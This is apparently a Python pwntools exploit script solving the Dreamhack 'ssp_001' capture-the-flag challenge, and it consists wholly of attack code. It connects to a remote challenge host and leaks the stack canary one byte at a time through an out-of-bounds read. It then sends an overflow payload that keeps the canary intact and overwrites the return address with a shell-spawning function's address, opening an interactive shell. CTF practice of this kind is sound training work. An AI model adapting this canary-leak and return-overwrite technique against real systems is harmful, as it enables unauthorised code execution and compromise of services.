from pwn import *

context.update(log_level='debug')

#p = process('ssp_001')
p = remote('host1.dreamhack.games', 22915)

p.sendlineafter('> ', 'F')

p.sendlineafter(': ', 'a'*0x39)

canary = ''
for i in range(4):
    p.sendlineafter('> ', 'P')
    p.sendlineafter(': ', str(0x80 + i))
    canary += p.recvline().split(': ')[1].replace('\n', '')
canary = u32(canary.decode('hex'))
log.info('canary: ' + hex(canary))

p.sendlineafter('> ', 'E')
p.sendlineafter(': ', str(0x88+4))
addr_shell = 0x80486B9
#raw_input('debug: ' + str(p.pid))
p.sendlineafter(': ', 'a'*0x40 + p32(canary) + 'c'*8 + p32(addr_shell))
p.interactive()
